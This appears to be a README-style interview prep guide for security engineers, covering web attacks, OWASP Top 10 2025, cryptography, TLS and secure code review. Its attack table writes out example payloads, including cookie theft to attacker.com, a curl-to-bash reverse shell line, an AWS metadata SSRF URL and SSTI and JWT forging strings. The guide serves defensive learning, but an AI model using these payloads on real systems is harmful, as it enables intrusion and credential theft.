# Security Engineer Interview Prep — Application Security Reference Guide

![OWASP](https://img.shields.io/badge/Reference-OWASP%20Top%2010%202025-000000?logo=owasp&logoColor=white)
![AppSec](https://img.shields.io/badge/Focus-Application%20Security-red)
![Cryptography](https://img.shields.io/badge/Topic-Cryptography%20%7C%20TLS-7B42BC)
![Threat Modeling](https://img.shields.io/badge/Topic-Threat%20Modeling%20%7C%20STRIDE-orange)
![MITRE ATT&CK](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-CC0000)
![Python](https://img.shields.io/badge/Code%20Review-Python-3776AB?logo=python&logoColor=white)

> A comprehensive reference guide for Security Engineer interviews at top tech companies. Covers web application vulnerabilities, OWASP Top 10 (2025), cryptography fundamentals, secure code review patterns, and common interview questions with concise recall answers.

---

## Table of Contents

- [Attack Reference Table](#attack-reference-table)
- [OWASP Top 10 — 2025 Edition](#owasp-top-10--2025-edition)
- [Interview Questions — Quick Recall](#interview-questions--quick-recall)
- [Cryptography Quick Reference](#cryptography-quick-reference)
- [Secure Code Review — Instant Flag Patterns](#secure-code-review--instant-flag-patterns)
- [TLS Handshake Overview](#tls-handshake-overview)
- [Authentication and Authorization Protocols](#authentication-and-authorization-protocols)

---

## Attack Reference Table

A breakdown of common web and application security attacks including what they are, their theoretical and practical impact, and notable real-world incidents.

| Attack | What It Is | Theoretical Impact | Practical Attack Example | Real-World Incident |
|--------|-----------|-------------------|------------------------|---------------------|
| **SQL Injection** | User input interpreted as SQL query code | Read, modify, delete database records; bypass authentication; potentially execute OS commands | `' OR '1'='1` returns all records; `UNION SELECT` extracts data from other tables | Heartland Payment Systems (2008) — 130M credit cards stolen via SQLi |
| **XSS (Stored)** | Malicious script persisted in database, executes for every user who views the page | Session hijacking, keylogging, phishing, performing actions as victim | Attacker posts `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>` in a comment field — every visitor's session is stolen | Samy worm on MySpace (2005) — self-propagating XSS added 1M friends in 24 hours |
| **XSS (Reflected)** | Malicious script in URL parameter reflected back in server response | Same as stored XSS, but requires victim to click a crafted link | Attacker sends link: `https://site.com/search?q=<script>steal_cookie()</script>` — victim clicks, script executes in their browser | Widely used in phishing campaigns targeting specific individuals |
| **XSS (DOM-based)** | Client-side JavaScript unsafely writes user input to DOM; payload never reaches server | Same as other XSS types, but harder to detect server-side | Page JS reads `window.location.hash` and writes it via `innerHTML` — attacker crafts URL with malicious hash fragment | Used to bypass server-side XSS filters |
| **CSRF** | Attacker's site triggers authenticated requests to victim's site using victim's automatically attached cookies | Unauthorized state changes — transfers, email changes, password resets | Hidden form on `evil.com` auto-submits `POST /transfer?to=attacker&amount=5000` to `bank.com` with victim's session cookies | Router DNS hijacking — changing home router DNS settings via CSRF from a malicious webpage |
| **SSRF** | Server tricked into making requests to internal resources attacker can't reach directly | Access cloud metadata, internal services, databases; credential theft; internal network scanning | Attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as an image URL — server fetches and returns AWS IAM credentials | Capital One (2019) — SSRF used to steal IAM credentials, 100M+ customer records accessed from S3 |
| **Command Injection** | User input inserted into OS system commands | Full server compromise — read/write files, install backdoors, reverse shell, pivot to other systems | Input `; curl attacker.com/shell.sh \| bash` appended to a parameter in `os.system()` — attacker gets reverse shell | Shellshock (2014) — Bash vulnerability allowed command injection via HTTP headers |
| **Insecure Deserialization** | Untrusted data fed into deserialization functions that execute code during object reconstruction | Remote code execution, denial of service, authentication bypass | Malicious pickle payload with `__reduce__` calling `os.system('reverse_shell')` — server executes it on `pickle.loads()` | Equifax breach (2017) — Apache Struts Java deserialization bug, 147M records exposed |
| **SSTI** | User input included in server-side template string; template engine evaluates and executes it | Remote code execution, server takeover, data exfiltration | Attacker submits `{{ ''.__class__.__mro__[1].__subclasses__() }}` — Jinja2 evaluates it and exposes Python internals leading to RCE | Uber SSTI bug bounty — template injection in Jinja2 led to RCE |
| **IDOR** | Attacker modifies resource identifiers in requests to access other users' data | Unauthorized data access, data breach at scale via enumeration | Change `/api/invoices/1001` to `/api/invoices/1002` — access another customer's invoice | Uber trip data exposure — any user could view any other user's trip details by changing the trip ID |
| **Broken Authentication** | Weak passwords, missing MFA, predictable session tokens, credential stuffing | Account takeover, identity theft, unauthorized access | Attacker uses leaked credentials from one breach to log into victims' banking accounts (credential stuffing) | Collection #1 (2019) — 773M email/password combinations used for mass credential stuffing |
| **Mass Assignment** | Application accepts user-controlled fields that modify security-sensitive attributes like role or permissions | Privilege escalation, unauthorized role changes | Attacker adds `"role": "admin"` to a profile update JSON body — server saves all fields including role directly to database | GitHub (2012) — mass assignment vulnerability allowed privilege escalation to admin on any repository |
| **Race Condition** | Two concurrent requests exploit the timing gap between checking a condition and acting on it (TOCTOU) | Double spending, bypassing rate limits, privilege escalation | Two simultaneous coupon redemption requests — both pass the "is coupon used?" check before either writes "used" | Multiple e-commerce bug bounties for double-spending single-use gift cards |
| **MITM** | Attacker intercepts communication between two parties by positioning themselves in the network path | Eavesdropping, data modification, credential theft, session hijacking | ARP spoofing on coffee shop WiFi routes all traffic through attacker's machine; captures credentials sent over HTTP | DigiNotar CA compromise (2011) — fraudulent certificates used to intercept Gmail communications of Iranian citizens |
| **ReDoS** | Malicious regex pattern causes catastrophic backtracking, consuming server CPU | Denial of service — a single request can freeze a server thread indefinitely | Attacker submits `(a+)+$` as a search filter where user input is compiled as regex — server CPU spikes to 100% | Cloudflare outage (2019) — a single regex rule caused global service disruption |
| **JWT None Algorithm** | Server accepts JWT tokens with `alg: none`, allowing completely unsigned tokens | Complete authentication bypass; impersonate any user | Attacker crafts JWT with `{"alg":"none"}` header and `{"user_id":"admin"}` payload, strips signature — server accepts it | Multiple CVEs across JWT libraries that defaulted to accepting `none` algorithm |
| **Timing Attack** | Measuring response time differences during secret comparison to extract values character by character | API key extraction, password guessing, token discovery | String comparison `==` short-circuits on first mismatch — attacker measures response times to determine each character | Early OpenSSL HMAC verification was vulnerable to timing attacks |
| **Log Injection** | Attacker injects fake log entries via unsanitized input containing newline characters | Covering tracks, framing other users, corrupting audit trails, misleading incident response | Username set to `admin\n2024-01-01 INFO: Successful login by admin` creates fake log entry | Used in combination with other attacks to erase evidence of exploitation |

---

## OWASP Top 10 — 2025 Edition

The latest OWASP Top 10 released in 2025. Key changes from 2021: SSRF merged into Broken Access Control, Security Misconfiguration rose to #2, "Vulnerable and Outdated Components" evolved into "Software Supply Chain Failures," and "Mishandling of Exceptional Conditions" is a new entry at #10.

| # | Category | One-Liner Summary |
|---|----------|-------------------|
| **A01** | Broken Access Control | The app doesn't enforce who can do what — fix by denying by default, enforcing server-side, and validating object ownership on every request. Now includes SSRF. |
| **A02** | Security Misconfiguration | The environment is set up wrong — default credentials, debug mode in production, missing headers, overly permissive cloud settings. Fix with hardened baselines, automated config scanning, and removing everything you don't need. |
| **A03** | Software Supply Chain Failures | Goes beyond known CVEs — attackers can poison dependencies, tamper with build pipelines, or compromise trusted packages. Fix by verifying artifact integrity, signing packages, maintaining an SBOM, and securing CI/CD pipelines. |
| **A04** | Cryptographic Failures | Sensitive data isn't properly protected — not encrypted, using weak algorithms, or keys are mismanaged. Fix by classifying data, encrypting at rest (AES-256-GCM) and in transit (TLS 1.2+), using bcrypt for passwords, and managing keys properly. |
| **A05** | Injection | Untrusted data is interpreted as code — fix by parameterizing queries, validating input, encoding output, avoiding dangerous functions, and applying least privilege. |
| **A06** | Insecure Design | The architecture itself is flawed — no amount of secure coding fixes a bad design. Prevent with threat modeling, abuse case analysis, and secure design patterns before writing code. |
| **A07** | Authentication Failures | Passwords are weak, sessions are predictable, nothing stops automated attacks — fix with MFA, bcrypt, secure session tokens, rate limiting, and breach-list checking. |
| **A08** | Software and Data Integrity Failures | Running code you didn't verify — supply chain poisoning, compromised CI/CD pipelines, or insecure deserialization. Fix by signing artifacts, securing pipelines, and never deserializing untrusted data. |
| **A09** | Security Logging and Alerting Failures | If you can't see it, you can't stop it — log auth events, authorization failures, and high-value actions to a centralized SIEM, alert on anomalies, and have incident response playbooks ready. |
| **A10** | Mishandling of Exceptional Conditions | Applications fail to handle errors securely — crashing, leaking stack traces, failing open instead of closed. Fix by failing closed, catching all exceptions gracefully, never exposing internal errors, and testing edge cases. |

---

## Interview Questions — Quick Recall

Concise recall answers for commonly asked security engineer interview questions.

| Question | Recall Answer |
|----------|---------------|
| **Explain XSS and its types** | XSS injects malicious scripts into pages viewed by other users — stored persists in the database, reflected bounces off the server, DOM-based never leaves the browser. Prevent with output encoding, CSP headers, and HttpOnly cookies. |
| **How is CSRF dangerous?** | CSRF exploits the browser's automatic cookie attachment to make authenticated requests from a malicious site — prevent with anti-CSRF tokens, SameSite cookies, and Origin header validation. |
| **Explain CORS, SOP, and CSP** | SOP is the browser's default wall between origins. CORS is a controlled door in that wall — misconfigure it and attackers walk through. CSP tells the browser what's allowed to execute on your page, killing XSS even if injection succeeds. |
| **What is insecure deserialization?** | Formats like pickle or Java's ObjectInputStream rebuild objects from untrusted data — attackers embed code execution instructions in the serialized payload. Fix by using JSON, which can only represent data, never code. |
| **Authentication vs Authorization** | Authentication verifies who you are, authorization verifies what you can do — implement auth with bcrypt + MFA + secure sessions, implement authz with RBAC server-side on every request, and never trust the client for either. |
| **What happens when you type a URL?** | DNS resolves the domain, TCP establishes the connection, TLS encrypts it, HTTP sends the request, the server processes and responds with security headers, and the browser renders while enforcing CSP and SRI — every layer has security implications. |
| **Prevent brute force attacks** | Layer rate limiting per user and per IP, account lockout with CAPTCHA, MFA, generic error messages, breach-list password checking, and anomaly alerting — credential stuffing and password spraying need different defenses than simple brute force. |
| **Explain SSRF** | SSRF turns your server into a proxy for the attacker to reach internal resources — devastating in cloud because the metadata endpoint hands out IAM credentials. Fix by blocking internal IPs, enforcing IMDSv2, and restricting network access. |
| **Critical vuln before launch** | Quantify the risk with data, explore quick mitigations like WAF rules or feature flags that don't delay launch, present stakeholders with clear options and trade-offs, document the decision with sign-off, and schedule the full fix regardless. |
| **Explain threat modeling (STRIDE)** | STRIDE maps threats to security properties — Spoofing/authentication, Tampering/integrity, Repudiation/accountability, Information Disclosure/confidentiality, DoS/availability, Elevation of Privilege/authorization. Apply systematically at every trust boundary. |
| **How does MITM work?** | Attackers intercept communication via ARP spoofing, DNS poisoning, rogue WiFi, or fraudulent certificates — prevent with TLS everywhere, HSTS to block SSL stripping, certificate pinning, and DNSSEC. |
| **What is certificate pinning?** | Hardcodes which specific certificate or public key your app trusts, so even a compromised CA can't issue a fake cert your app accepts — use for mobile apps and service-to-service, not general websites due to operational risk. |
| **How to secure a REST API** | Layer authentication (OAuth 2.0 + JWT), authorization on every request with object ownership validation, strict input schema validation, TLS everywhere, rate limiting, minimal error responses, and comprehensive logging — never trust the client. |
| **Horizontal vs vertical privilege escalation** | Horizontal accesses another user's data at the same level, vertical gains higher privileges like admin — both stem from broken access control. Prevent with server-side authorization on every request, object ownership validation, and field-level allowlisting. |
| **Command injection vs SQL injection** | Command injection targets the OS through system calls, SQL injection targets the database through queries — both happen when user input is concatenated into executable strings instead of being treated as data. |
| **Encoding vs encryption vs hashing** | Encoding transforms format for compatibility — anyone can reverse it. Encryption transforms for confidentiality — only the key holder can reverse it. Hashing transforms for integrity — nobody can reverse it. Using the wrong one creates vulnerabilities. |
| **What is a race condition?** | Exploits the gap between checking a condition and acting on it — two requests both pass the check before either writes the result. Fix with atomic database operations, row-level locking, and idempotency keys. |

---

## Cryptography Quick Reference

| Concept | Key Points |
|---------|------------|
| **Symmetric Encryption** | Same key encrypts and decrypts. Standard: AES-256-GCM. Fast — used for bulk data encryption at rest and in transit. |
| **Asymmetric Encryption** | Public key encrypts, private key decrypts (or vice versa for signing). Standards: RSA (2048+ bit), ECC. Slow — used for key exchange and digital signatures. |
| **Hashing (Data Integrity)** | SHA-256, SHA-512. One-way, fast. Used for file checksums, digital signatures, data verification. |
| **Hashing (Passwords)** | bcrypt, scrypt, Argon2. One-way, deliberately slow to resist brute force. Never use SHA-256 or MD5 for passwords. |
| **Deprecated / Broken** | MD5, SHA-1 (collision attacks practical), DES, 3DES, RC4, TLS 1.0/1.1. |
| **Block Cipher Modes** | ECB → never use (patterns leak through). CBC → acceptable. GCM → preferred (encrypts + authenticates in one operation). |
| **Data at Rest** | AES-256-GCM for retrievable data. bcrypt/Argon2 for passwords. Never ECB, never MD5. |
| **Data in Transit** | TLS 1.2 minimum, TLS 1.3 preferred. Disable TLS 1.0/1.1. |
| **Forward Secrecy** | New ephemeral Diffie-Hellman keys per session, discarded after use. If server's private key leaks later, past sessions stay safe. Required in TLS 1.3, optional in TLS 1.2. |
| **Digital Signatures** | Hash the data (SHA-256) → encrypt the hash with private key → recipient verifies with public key. Provides authenticity and integrity. |

---

## TLS Handshake Overview

### TLS 1.2

1. **Client Hello** — sends supported TLS versions, cipher suites, and client random
2. **Server Hello** — picks version and cipher suite, sends certificate with public key
3. **Certificate Verification** — client verifies certificate against trusted CAs
4. **Key Exchange** — client generates pre-master secret, encrypts it with server's public key, sends to server
5. **Session Key Derivation** — both sides derive symmetric keys from pre-master secret + randoms
6. **Finished** — both sides confirm with encrypted messages
7. **Application Data** — all data encrypted with symmetric AES keys

> **Limitation:** If using RSA key exchange and the server's private key is later compromised, all recorded past sessions can be decrypted. No forward secrecy unless Diffie-Hellman is used.

### TLS 1.3

1. **Client Hello** — includes key share (ECDHE public value) upfront
2. **Server Hello** — picks cipher suite, sends certificate and its own key share
3. **Certificate Verification** — client verifies certificate
4. **Key Exchange** — both sides compute shared secret via ECDHE (ephemeral Diffie-Hellman)
5. **Session Key Derivation** — shared secret + randoms → symmetric keys via HKDF
6. **Finished** — encrypted confirmation
7. **Application Data** — all data encrypted with AES-GCM

> **Improvement:** Forward secrecy is mandatory. RSA key exchange removed entirely. Fewer round trips (faster). Only strong cipher suites allowed.

### Key Difference

TLS 1.2 can encrypt the shared secret with the server's public key (no forward secrecy). TLS 1.3 forces ephemeral Diffie-Hellman so past sessions stay safe even if the private key leaks.

---

## Authentication and Authorization Protocols

| Protocol | Purpose | Key Details |
|----------|---------|-------------|
| **OAuth 2.0** | Delegated authorization | Answers "what can this app do on behalf of this user?" Used for third-party app access without sharing passwords. |
| **OpenID Connect (OIDC)** | Authentication layer on top of OAuth 2.0 | Answers "who is this user?" Adds identity verification to OAuth's authorization framework. |
| **SAML** | Enterprise SSO authentication | Answers "who is this user?" XML-based, older, widely used in enterprise environments. |
| **JWT** | Token format | Carries claims about user identity and permissions. Used by OAuth/OIDC. Watch for `none` algorithm attacks. |
| **Kerberos** | Network authentication | Answers "who is this user?" Ticket-based, used in Active Directory environments. |

---

## Secure Code Review — Instant Flag Patterns

Patterns to identify immediately during code review, with associated vulnerabilities and fixes.

| Code Pattern | Vulnerability | Immediate Fix |
|-------------|--------------|---------------|
| `random.choices()` / `random.randint()` | Predictable PRNG — tokens can be guessed | Use `secrets` module |
| `pickle.loads()` / `yaml.load()` / `eval()` / `exec()` | Insecure deserialization — RCE | Use `json.loads()` / `yaml.safe_load()` |
| `subprocess.run(..., shell=True)` with user input | Command injection — RCE | Use `shell=False` with argument list |
| `render_template_string()` with user input | SSTI — RCE | Use `render_template()` with template files |
| User input in `re.compile()` | ReDoS — denial of service | Use simple string matching or `re2` library |
| `==` for secret/token comparison | Timing attack — secret extraction | Use `hmac.compare_digest()` |
| User-controlled `role` / `permissions` fields in request body | Mass assignment — privilege escalation | Server-side allowlist of updateable fields |
| String concatenation/f-strings in SQL queries | SQL injection — data breach | Parameterized queries / prepared statements |
| User input rendered in HTML without encoding | XSS — session hijacking | Output encoding + CSP headers + auto-escaping frameworks |
| `SECRET_KEY = "hardcoded_value"` | Key compromise — auth bypass | Environment variables or secrets manager |
| `algorithms=["HS256", "none"]` in JWT decode | JWT `none` algorithm — full auth bypass | Specify only intended algorithm: `["HS256"]` |
| `logging.basicConfig(level=logging.DEBUG)` in production | Information disclosure — sensitive data in logs | Use `WARNING` or `INFO` in production |
| `hashlib.md5()` for any security purpose | Weak hash — collisions practical | `hashlib.sha256()` for integrity, `bcrypt` for passwords |
| No file type or size validation on upload endpoints | Malicious file upload / DoS | Allowlist extensions, validate MIME and magic bytes, set `MAX_CONTENT_LENGTH` |
| `os.path.join(base_dir, user_input)` without sanitization | Path traversal — arbitrary file read/write | Use `werkzeug.utils.secure_filename()`, validate resolved path stays within base directory |
| API keys or secrets in log statements | Credential exposure via logs | Log truncated identifiers only (last 4 chars) |
| `open(filepath, 'rb')` without context manager | File handle leak | Use `with open(...) as f:` |
| No `HttpOnly` / `Secure` / `SameSite` flags on session cookies | Session hijacking via XSS, CSRF | Set all three flags on sensitive cookies |
| `Access-Control-Allow-Origin: *` on authenticated endpoints | CORS misconfiguration — data theft | Restrict to specific trusted origins |

---

## Threat Modeling Frameworks

| Framework | What It Does | Best For |
|-----------|-------------|----------|
| **STRIDE** | Categorizes threats into 6 types (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege) | Analyzing specific components and features. Most commonly used in interviews. |
| **DREAD** | Scores threats by Damage, Reproducibility, Exploitability, Affected users, Discoverability (1-10 each) | Prioritizing which threats to fix first after identification. |
| **PASTA** | Seven-stage risk-centric process from business objectives down to technical attack simulation | Aligning security analysis with business goals. More comprehensive but heavier. |
| **Attack Trees** | Visual tree diagrams where root = attacker's goal, branches = different attack paths | Visualizing all possible paths to a specific attack goal. |
| **MITRE ATT&CK** | Knowledge base of real-world attacker tactics, techniques, and procedures organized by attack phase | Understanding how real attackers operate and mapping defenses against known TTPs. |

---

## Contributing

This reference guide is a living document. Contributions, corrections, and additions are welcome via pull request.

## License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.